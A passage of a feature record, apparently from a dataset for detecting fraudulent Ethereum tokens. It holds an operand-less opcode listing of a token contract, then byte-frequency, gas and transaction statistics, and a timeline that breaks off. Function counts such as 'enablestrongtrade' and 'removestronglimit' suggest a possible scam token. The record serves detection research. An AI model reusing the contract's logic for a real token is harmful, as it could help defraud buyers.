PUSH1 PUSH2 DUP4 PUSH2 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP7 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD PUSH1 AND ISZERO PUSH1 SLOAD SWAP1 SWAP3 POP PUSH1 PUSH1 PUSH1 SHL SUB DUP7 DUP2 AND SWAP2 AND EQ PUSH2 JUMPI PUSH1 SLOAD PUSH1 PUSH1 PUSH1 SHL SUB DUP8 DUP2 AND SWAP2 AND EQ PUSH2 JUMPI PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH2 JUMP JUMPDEST PUSH1 JUMPDEST PUSH1 AND SWAP1 POP PUSH2 DUP3 DUP3 DUP7 PUSH2 JUMP JUMPDEST ISZERO PUSH2 JUMPI PUSH2 DUP5 PUSH2 JUMP JUMPDEST PUSH2 DUP7 DUP7 DUP7 DUP6 DUP6 PUSH2 JUMP JUMPDEST POP PUSH1 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 DUP2 MSTORE PUSH20 PUSH1 SHL PUSH1 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 PUSH1 PUSH1 SHL SUB DUP7 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 SWAP1 SWAP2 MSTORE SWAP2 DUP3 SHA3 SLOAD PUSH2 SWAP2 DUP5 SWAP1 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP7 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP1 DUP3 SHA3 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP6 AND DUP2 MSTORE SHA3 SLOAD PUSH2 SWAP1 DUP4 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP6 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 DUP2 SWAP1 SHA3 SWAP4 SWAP1 SWAP4 SSTORE SWAP2 MLOAD SWAP1 DUP7 AND SWAP1 PUSH32 SWAP1 PUSH2 SWAP1 DUP7 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP PUSH1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 SLOAD PUSH1 SWAP1 DUP2 DUP2 DUP5 GT DUP1 ISZERO PUSH2 JUMPI POP ADDRESS PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD DUP3 LT JUMPDEST PUSH1 SLOAD SWAP1 SWAP2 POP PUSH1 AND ISZERO DUP1 ISZERO PUSH2 JUMPI POP DUP6 JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 SLOAD PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 DUP6 GT JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP DUP1 JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 NOT AND PUSH1 OR SWAP1 SSTORE ADDRESS PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP2 SHA3 SLOAD SWAP1 POP PUSH1 PUSH2 DUP4 PUSH2 DUP5 PUSH1 SLOAD PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST PUSH1 DUP1 MLOAD PUSH1 DUP1 DUP3 MSTORE PUSH1 DUP3 ADD DUP4 MSTORE SWAP3 SWAP4 POP PUSH1 SWAP3 SWAP1 SWAP2 PUSH1 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP ADDRESS DUP2 PUSH1 DUP2 MLOAD DUP2 LT PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP3 DUP4 AND PUSH1 SWAP2 DUP3 MUL SWAP3 SWAP1 SWAP3 ADD DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 SLOAD PUSH1 DUP1 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP1 SWAP4 AND SWAP3 PUSH4 SWAP3 PUSH1 DUP1 DUP4 ADD SWAP4 SWAP2 SWAP3 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 NOT PUSH1 DUP3 ADD AND DUP3 ADD DUP1 PUSH1 MSTORE POP DUP2 ADD SWAP1 PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST DUP2 PUSH1 DUP2 MLOAD DUP2 LT PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB SWAP3 DUP4 AND PUSH1 SWAP2 DUP3 MUL SWAP3 SWAP1 SWAP3 ADD ADD MSTORE PUSH1 SLOAD PUSH1 MLOAD PUSH4 PUSH1 SHL DUP2 MSTORE SWAP2 AND SWAP1 PUSH4 SWAP1 PUSH2 SWAP1 DUP6 SWAP1 PUSH1 SWAP1 DUP7 SWAP1 ADDRESS SWAP1 TIMESTAMP SWAP1 PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP PUSH1 SLOAD PUSH1 MLOAD SELFBALANCE SWAP4 POP PUSH1 PUSH1 PUSH1 SHL SUB SWAP1 SWAP2 AND SWAP2 POP DUP3 ISZERO PUSH2 MUL SWAP1 DUP4 SWAP1 PUSH1 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP PUSH1 DUP1 SLOAD PUSH1 NOT AND SWAP1 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 DUP3 PUSH2 JUMPI PUSH1 SLOAD PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND PUSH2 JUMPI DUP4 PUSH2 JUMP JUMPDEST PUSH2 DUP3 DUP5 DUP7 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST DUP4 JUMPDEST PUSH1 SLOAD SWAP1 SWAP2 POP PUSH1 SWAP1 PUSH1 PUSH1 SHL SWAP1 DIV PUSH1 AND DUP1 ISZERO PUSH2 JUMPI POP DUP4 JUMPDEST PUSH2 JUMPI DUP5 PUSH2 JUMP JUMPDEST PUSH2 DUP4 DUP6 DUP8 PUSH2 JUMP JUMPDEST SWAP1 POP PUSH2 DUP3 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH20 PUSH1 SHL DUP2 MSTORE POP PUSH1 PUSH1 DUP12 PUSH1 PUSH1 PUSH1 SHL SUB AND PUSH1 PUSH1 PUSH1 SHL SUB AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD PUSH2 SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 AND JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP10 AND PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 DUP1 DUP3 SHA3 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP9 AND DUP2 MSTORE SHA3 SLOAD PUSH2 SWAP1 DUP3 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP1 DUP9 AND PUSH1 DUP2 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 DUP2 SWAP1 SHA3 SWAP4 SWAP1 SWAP4 SSTORE SWAP2 MLOAD SWAP1 DUP10 AND SWAP1 PUSH32 SWAP1 PUSH2 SWAP1 DUP6 DUP2 MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH2 DUP4 DUP6 PUSH2 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 DUP2 DUP4 GT PUSH2 JUMPI DUP3 PUSH2 JUMP JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP5 PUSH2 JUMPI PUSH1 PUSH2 JUMP JUMPDEST PUSH1 DUP7 GT PUSH2 JUMPI PUSH1 DUP7 GT PUSH2 JUMPI PUSH1 PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 SLOAD GT PUSH2 JUMPI PUSH1 SLOAD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH2 JUMP JUMPDEST PUSH1 SLOAD PUSH1 SLOAD GT PUSH2 JUMPI PUSH1 SLOAD PUSH2 JUMP JUMPDEST PUSH1 SLOAD JUMPDEST SWAP2 POP PUSH1 PUSH2 DUP3 PUSH2 DUP8 DUP7 PUSH2 JUMP JUMPDEST SWAP1 PUSH2 JUMP JUMPDEST ADDRESS PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SLOAD SWAP1 SWAP2 POP PUSH2 SWAP1 DUP3 PUSH2 JUMP JUMPDEST ADDRESS PUSH1 SWAP1 DUP2 MSTORE PUSH1 PUSH1 MSTORE PUSH1 SWAP1 SHA3 SSTORE DUP6 PUSH2 JUMPI PUSH2 DUP4 DUP7 PUSH2 JUMP JUMPDEST PUSH2 JUMP JUMPDEST DUP1 JUMPDEST SWAP1 POP PUSH2 DUP6 DUP3 PUSH2 JUMP JUMPDEST SWAP8 SWAP7 POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 DUP3 PUSH1 SUB PUSH2 JUMPI POP PUSH1 PUSH2 JUMP JUMPDEST PUSH1 PUSH2 DUP4 DUP6 PUSH2 JUMP JUMPDEST SWAP1 POP DUP3 PUSH2 DUP6 DUP4 PUSH2 JUMP JUMPDEST EQ PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 DUP3 ADD MSTORE PUSH32 PUSH1 DUP3 ADD MSTORE PUSH1 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD PUSH2 JUMP JUMPDEST PUSH1 PUSH2 DUP4 DUP4 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH32 DUP2 MSTORE POP PUSH2 JUMP JUMPDEST PUSH1 PUSH2 DUP4 DUP4 PUSH1 MLOAD DUP1 PUSH1 ADD PUSH1 MSTORE DUP1 PUSH1 DUP2 MSTORE PUSH1 ADD PUSH32 DUP2 MSTORE POP PUSH2 JUMP JUMPDEST PUSH1 DUP2 DUP4 PUSH2 JUMPI PUSH1 MLOAD PUSH3 PUSH1 SHL DUP2 MSTORE PUSH1 ADD PUSH2 SWAP2 SWAP1 PUSH2 JUMP JUMPDEST POP PUSH1 PUSH2 DUP5 DUP7 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH1 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 ADD MSTORE DUP3 ADD PUSH2 JUMP JUMPDEST POP PUSH1 PUSH1 DUP3 DUP7 ADD ADD MSTORE PUSH1 PUSH1 NOT PUSH1 DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SHL SUB DUP2 AND DUP2 EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP5 PUSH1 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP4 CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 POP PUSH1 DUP5 ADD CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP3 SWAP6 SWAP3 SWAP5 POP POP POP PUSH1 SWAP2 SWAP1 SWAP2 ADD CALLDATALOAD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST PUSH1 DUP1 PUSH1 DUP4 DUP6 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST SWAP2 POP PUSH1 DUP4 ADD CALLDATALOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 DUP1 DUP3 MSTORE PUSH1 SWAP1 DUP3 ADD MSTORE PUSH6 PUSH1 SHL PUSH1 DUP3 ADD MSTORE PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH1 PUSH1 DUP3 DUP5 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH2 DUP2 PUSH2 JUMP JUMPDEST PUSH1 DUP1 PUSH1 PUSH1 DUP5 DUP7 SUB SLT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP4 MLOAD SWAP3 POP PUSH1 DUP5 ADD MLOAD SWAP2 POP PUSH1 DUP5 ADD MLOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST PUSH1 PUSH1 DUP3 ADD PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST POP PUSH1 ADD SWAP1 JUMP JUMPDEST PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST PUSH1 PUSH1 DUP3 ADD DUP8 DUP4 MSTORE PUSH1 DUP8 DUP2 DUP6 ADD MSTORE PUSH1 PUSH1 DUP6 ADD MSTORE DUP2 DUP8 MLOAD DUP1 DUP5 MSTORE PUSH1 DUP7 ADD SWAP2 POP DUP3 DUP10 ADD SWAP4 POP PUSH1 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 JUMPI DUP5 MLOAD PUSH1 PUSH1 PUSH1 SHL SUB AND DUP4 MSTORE SWAP4 DUP4 ADD SWAP4 SWAP2 DUP4 ADD SWAP2 PUSH1 ADD PUSH2 JUMP JUMPDEST POP POP PUSH1 PUSH1 PUSH1 SHL SUB SWAP7 SWAP1 SWAP7 AND PUSH1 DUP6 ADD MSTORE POP POP POP PUSH1 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 MUL DUP2 ISZERO DUP3 DUP3 DIV DUP5 EQ OR PUSH2 JUMPI PUSH2 PUSH2 JUMP JUMPDEST PUSH1 DUP3 PUSH2 JUMPI PUSH4 PUSH1 SHL PUSH1 MSTORE PUSH1 PUSH1 MSTORE PUSH1 PUSH1 REVERT JUMPDEST POP DIV SWAP1 JUMP UNKNOWN_0xfe LOG2 PUSH5 UNKNOWN_0x22 SLT SHA3 EQ UNKNOWN_0xeb UNKNOWN_0xd2 DUP4 UNKNOWN_0xcf UNKNOWN_0x2f SWAP14 UNKNOWN_0xec SLOAD XOR CALLDATASIZE UNKNOWN_0x4b RETURNDATACOPY SWAP14 SAR SWAP16 DUP2 UNKNOWN_0x2e UNKNOWN_0xb5 DIV UNKNOWN_0xde SWAP12 UNKNOWN_0x2c PUSH1 DUP1 XOR PUSH19 STOP STOP STOP STOP STOP STOP STOP STOP SWAP15 DUP4 UNKNOWN_0xc2 COINBASE UNKNOWN_0x2c INVALID_0x7d",
  "opcode_entropy": 4.8716740866630435,
  "opcode_count": 4738,
  "unique_opcodes": 98,
  "byte_entropy": 6.1083441976281385,
  "byte_0x": 0.00013609145345672293,
  "byte_60": 0.11799129014697878,
  "byte_80": 0.032253674469243335,
  "byte_40": 0.013881328252585737,
  "byte_52": 0.028579205225911813,
  "byte_01": 0.04436581382689167,
  "byte_54": 0.01347305389221557,
  "byte_a0": 0.009254218835057159,
  "byte_1b": 0.018372346216657592,
  "byte_03": 0.018916712030484485,
  "byte_19": 0.003538377789874796,
  "byte_90": 0.03497550353837779,
  "byte_81": 0.02653783342406097,
  "byte_16": 0.02041371801850844,
  "byte_73": 0.003402286336418073,
  "byte_7a": 0.001633097441480675,
  "byte_25": 0.0010887316276537834,
  "byte_0d": 0.003810560696788242,
  "byte_56": 0.023407729994556342,
  "byte_30": 0.0020413718018508437,
  "byte_b4": 0.0008165487207403375,
  "byte_cf": 0.0005443658138268917,
  "byte_53": 0.001633097441480675,
  "byte_97": 0.0006804572672836146,
  "byte_39": 0.0008165487207403375,
  "byte_df": 0.00040827436037016874,
  "byte_2c": 0.0009526401741970605,
  "byte_5d": 0.0005443658138268917,
  "byte_ac": 0.0008165487207403375,
  "byte_c6": 0.0005443658138268917,
  "byte_59": 0.0005443658138268917,
  "byte_f2": 0.0008165487207403375,
  "byte_48": 0.0013609145345672292,
  "byte_8d": 0.0012248230811105062,
  "byte_17": 0.0065323897659227,
  "byte_91": 0.013881328252585737,
  "byte_55": 0.006124115405552531,
  "byte_02": 0.009118127381600435,
  "byte_61": 0.04899292324442025,
  "byte_de": 0.0006804572672836146,
  "byte_ad": 0.0009526401741970605,
  "byte_62": 0.011567773543821448,
  "byte_00": 0.03769733260751225,
  "byte_12": 0.0036744692433315186,
  "byte_0a": 0.001905280348394121,
  "byte_2a": 0.00040827436037016874,
  "byte_5b": 0.035655960805661406,
  "byte_58": 0.00027218290691344586,
  "byte_63": 0.008573761567773544,
  "byte_05": 0.0024496461622210124,
  "byte_f5": 0.0010887316276537834,
  "byte_e1": 0.00040827436037016874,
  "byte_42": 0.0012248230811105062,
  "byte_64": 0.0036744692433315186,
  "byte_6e": 0.0036744692433315186,
  "byte_5c": 0.0010887316276537834,
  "byte_04": 0.010070767555797496,
  "byte_86": 0.007212847033206315,
  "byte_92": 0.006668481219379423,
  "byte_9e": 0.00040827436037016874,
  "byte_e8": 0.0008165487207403375,
  "byte_b5": 0.0005443658138268917,
  "byte_c1": 0.00027218290691344586,
  "byte_06": 0.005443658138268917,
  "byte_ff": 0.005307566684812194,
  "byte_13": 0.002177463255307567,
  "byte_0e": 0.0023135547087642897,
  "byte_0f": 0.0013609145345672292,
  "byte_10": 0.003538377789874796,
  "byte_11": 0.004627109417528579,
  "byte_14": 0.010342950462710943,
  "byte_34": 0.003810560696788242,
  "byte_15": 0.015242242787152967,
  "byte_57": 0.020685900925421885,
  "byte_fd": 0.009390310288513882,
  "byte_50": 0.029531845400108874,
  "byte_51": 0.010070767555797496,
  "byte_1c": 0.0006804572672836146,
  "byte_93": 0.004627109417528579,
  "byte_38": 0.00040827436037016874,
  "byte_83": 0.010479041916167664,
  "byte_27": 0.00027218290691344586,
  "byte_7f": 0.0020413718018508437,
  "byte_33": 0.001905280348394121,
  "byte_0b": 0.001769188894937398,
  "byte_94": 0.0012248230811105062,
  "byte_84": 0.007348938486663037,
  "byte_09": 0.001769188894937398,
  "byte_20": 0.020141535111594992,
  "byte_87": 0.0025857376156777356,
  "byte_88": 0.0014970059880239522,
  "byte_82": 0.016603157321720196,
  "byte_89": 0.0014970059880239522,
  "byte_85": 0.0058519324986390855,
  "byte_96": 0.0009526401741970605,
  "byte_95": 0.0014970059880239522,
  "byte_07": 0.0029940119760479044,
  "byte_dd": 0.001633097441480675,
  "byte_e2": 0.00040827436037016874,
  "byte_c8": 0.0006804572672836146,
  "byte_9b": 0.0010887316276537834,
  "byte_69": 0.0036744692433315186,
  "byte_c2": 0.0005443658138268917,
  "byte_b0": 0.0012248230811105062,
  "byte_68": 0.0020413718018508437,
  "byte_fc": 0.0010887316276537834,
  "byte_37": 0.0012248230811105062,
  "byte_aa": 0.0009526401741970605,
  "byte_2b": 0.0006804572672836146,
  "byte_a7": 0.0010887316276537834,
  "byte_f1": 0.0010887316276537834,
  "byte_c4": 0.0009526401741970605,
  "byte_a1": 0.0006804572672836146,
  "byte_28": 0.0006804572672836146,
  "byte_5a": 0.001769188894937398,
  "byte_4d": 0.0009526401741970605,
  "byte_23": 0.001633097441480675,
  "byte_b3": 0.0005443658138268917,
  "byte_ef": 0.0005443658138268917,
  "byte_a3": 0.0005443658138268917,
  "byte_4e": 0.0010887316276537834,
  "byte_7b": 0.0008165487207403375,
  "byte_71": 0.0013609145345672292,
  "byte_e0": 0.001905280348394121,
  "byte_24": 0.0036744692433315186,
  "byte_6c": 0.001769188894937398,
  "byte_5e": 0.00027218290691344586,
  "byte_b8": 0.0005443658138268917,
  "byte_d8": 0.0005443658138268917,
  "byte_cc": 0.0006804572672836146,
  "byte_3b": 0.0005443658138268917,
  "byte_74": 0.003538377789874796,
  "byte_18": 0.001905280348394121,
  "byte_d9": 0.00027218290691344586,
  "byte_ba": 0.00013609145345672293,
  "byte_f3": 0.0005443658138268917,
  "byte_fe": 0.00040827436037016874,
  "byte_36": 0.0014970059880239522,
  "byte_35": 0.001633097441480675,
  "byte_6f": 0.0036744692433315186,
  "byte_26": 0.00040827436037016874,
  "byte_8a": 0.0006804572672836146,
  "byte_99": 0.0005443658138268917,
  "byte_d1": 0.0012248230811105062,
  "byte_eb": 0.0006804572672836146,
  "byte_c7": 0.00040827436037016874,
  "byte_d6": 0.0008165487207403375,
  "byte_bf": 0.0005443658138268917,
  "byte_98": 0.00040827436037016874,
  "byte_8f": 0.00013609145345672293,
  "byte_ed": 0.00027218290691344586,
  "byte_3e": 0.001633097441480675,
  "byte_a4": 0.0005443658138268917,
  "byte_f0": 0.00027218290691344586,
  "byte_cd": 0.0025857376156777356,
  "byte_ea": 0.0005443658138268917,
  "byte_f8": 0.00040827436037016874,
  "byte_2e": 0.00040827436037016874,
  "byte_a8": 0.0005443658138268917,
  "byte_31": 0.0008165487207403375,
  "byte_4f": 0.0005443658138268917,
  "byte_a9": 0.00027218290691344586,
  "byte_9c": 0.00040827436037016874,
  "byte_bb": 0.00013609145345672293,
  "byte_49": 0.0009526401741970605,
  "byte_70": 0.0005443658138268917,
  "byte_a6": 0.00040827436037016874,
  "byte_b7": 0.0005443658138268917,
  "byte_3d": 0.003130103429504627,
  "byte_41": 0.0013609145345672292,
  "byte_ca": 0.0005443658138268917,
  "byte_72": 0.0036744692433315186,
  "byte_3c": 0.00027218290691344586,
  "byte_e5": 0.0027218290691344584,
  "byte_67": 0.0008165487207403375,
  "byte_6b": 0.00027218290691344586,
  "byte_6d": 0.0009526401741970605,
  "byte_f7": 0.0005443658138268917,
  "byte_9a": 0.00027218290691344586,
  "byte_2f": 0.00040827436037016874,
  "byte_b1": 0.00013609145345672293,
  "byte_08": 0.0024496461622210124,
  "byte_da": 0.00027218290691344586,
  "byte_ae": 0.00027218290691344586,
  "byte_65": 0.005171475231355471,
  "byte_8c": 0.0006804572672836146,
  "byte_9d": 0.00040827436037016874,
  "byte_46": 0.0025857376156777356,
  "byte_e6": 0.00013609145345672293,
  "byte_fb": 0.001905280348394121,
  "byte_1f": 0.0020413718018508437,
  "byte_af": 0.0005443658138268917,
  "byte_bd": 0.00027218290691344586,
  "byte_ec": 0.00040827436037016874,
  "byte_1e": 0.0006804572672836146,
  "byte_c3": 0.00027218290691344586,
  "byte_f9": 0.00027218290691344586,
  "byte_f6": 0.0006804572672836146,
  "byte_47": 0.0023135547087642897,
  "byte_d0": 0.00013609145345672293,
  "byte_3a": 0.0010887316276537834,
  "byte_0c": 0.0014970059880239522,
  "byte_9f": 0.00027218290691344586,
  "byte_7d": 0.0005443658138268917,
  "byte_c0": 0.00040827436037016874,
  "byte_b2": 0.00040827436037016874,
  "byte_29": 0.00040827436037016874,
  "byte_b9": 0.00027218290691344586,
  "byte_75": 0.0014970059880239522,
  "byte_66": 0.00326619488296135,
  "byte_77": 0.0005443658138268917,
  "byte_44": 0.001633097441480675,
  "byte_78": 0.0025857376156777356,
  "byte_1d": 0.00027218290691344586,
  "byte_22": 0.0005443658138268917,
  "byte_b6": 0.00013609145345672293,
  "byte_32": 0.0008165487207403375,
  "byte_db": 0.00040827436037016874,
  "byte_d2": 0.00027218290691344586,
  "byte_ee": 0.00027218290691344586,
  "byte_4b": 0.0013609145345672292,
  "byte_6a": 0.00040827436037016874,
  "byte_2d": 0.00013609145345672293,
  "byte_79": 0.0005443658138268917,
  "byte_fa": 0.0005443658138268917,
  "byte_d7": 0.00027218290691344586,
  "byte_43": 0.0010887316276537834,
  "byte_c9": 0.0006804572672836146,
  "byte_ce": 0.00013609145345672293,
  "byte_45": 0.00027218290691344586,
  "byte_5f": 0.00013609145345672293,
  "byte_c5": 0.00013609145345672293,
  "byte_1a": 0.0010887316276537834,
  "byte_dc": 0.00040827436037016874,
  "byte_d4": 0.00013609145345672293,
  "byte_e9": 0.00013609145345672293,
  "byte_e3": 0.00040827436037016874,
  "byte_ab": 0.00040827436037016874,
  "byte_4a": 0.00013609145345672293,
  "byte_8b": 0.00013609145345672293,
  "byte_76": 0.0005443658138268917,
  "byte_be": 0.00013609145345672293,
  "byte_e7": 0.00013609145345672293,
  "byte_f4": 0.00013609145345672293,
  "byte_21": 0.00013609145345672293,
  "byte_7e": 0.00013609145345672293,
  "byte_bc": 0.00013609145345672293,
  "byte_8e": 0.0005443658138268917,
  "byte_a2": 0.00013609145345672293,
  "num_nodes": 65,
  "num_edges": 65,
  "avg_degree": 2.0,
  "density": 0.015625,
  "connected_components": 1,
  "avg_clustering": 0.0,
  "txn_nums": 164,
  "event_nums": 324,
  "creation_block": 18722774,
  "creation_timestamp": 1701811103,
  "life_time": 1562472.0,
  "duration_seconds": 18913656.0,
  "from_creation_to_transfer": 0.0,
  "num_addresses": 66,
  "num_buyers": 3,
  "num_sellers": 64,
  "num_creator_transfers": 44,
  "buy_amt": 1.2928452267559223e+19,
  "sell_amt": 1.2928452267559223e+19,
  "avg_value": 1.567085123340512e+17,
  "txn_per_block": 0.00010496181374014143,
  "avg_gas_limit": 115759.26219512195,
  "std_gas_limit": 268398.58295900293,
  "avg_gas_used": 51120.91463414634,
  "std_gas_used": 262438.4709859744,
  "avg_gas_price": 28806432676.432926,
  "std_gas_price": 32656548123.80526,
  "transfer_num": 6,
  "approval_num": 66,
  "atinversebrah_num": 1,
  "createstrongtrade_num": 1,
  "enablestrongtrade_num": 1,
  "approve_num": 65,
  "removestronglimit_num": 1,
  "renounceownership_num": 1,
  "timeline_sequence": [
    [
      18722774,
      1701811103,
      0,
      86,
      0,
      1914064,
      59851559388,
      0,
      1,
      7684102,
      1914064,
      4362980
    ],
    [
      18722798,
      1701811391,
      1,
      125,
      0,
      87817,
      60347936233,
      0,
      1,
      13399548,
      58545,
      4362956
    ],
    [
      18722801,
      1701811427,
      2,
      116,
      10000000000000000000,
      31582,
      57795429064,
      0,
      1,
      9964047,
      21055,
      4362953
    ],
    [
      18722804,
      1701811463,
      3,
      68,
      0,
      2851423,
      57695429064,
      0,
      1,
      8540655,
      2801497,
      4362950
    ],
    [
      18722914,
      1701812783,
      6,
      19,
      0,
      28571,
      50557443979,
      0,
      1,
      2006351,
      28571,
      4362840
    ],
    [
      18722915,
      1701812795,
      811,
      24,
      0,
      120000,
      56176049225,
      0,
      1,
      3105611,
      46494,
      4362839
    ],
    [
      18722915,
      1701812795,
      402,
      25,
      0,
      120000,
      56176049225,
      0,
